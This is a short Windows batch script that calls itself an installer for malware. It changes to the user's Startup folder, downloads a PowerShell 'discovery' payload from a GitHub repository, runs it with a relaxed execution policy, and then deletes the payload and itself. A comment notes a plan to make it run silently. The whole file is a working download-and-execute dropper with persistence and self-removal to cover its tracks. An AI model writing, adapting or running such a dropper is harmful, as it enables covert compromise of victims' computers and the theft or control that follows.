@rem Installer for the malware
@rem TODO: Make the CMD prompt run silently

@echo off
set "CurrentDirectory=%CD%"
set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Change directory to startup
cd /d "%StartupDirectory%"

@REM Download required files
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"

@REM Run the PowerShell discovery
powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"

@REM Delete the discovery file
del "Discovery.ps1"

@REM Delete the original installer
cd /d %CurrentDirectory%
del "Installer.cmd"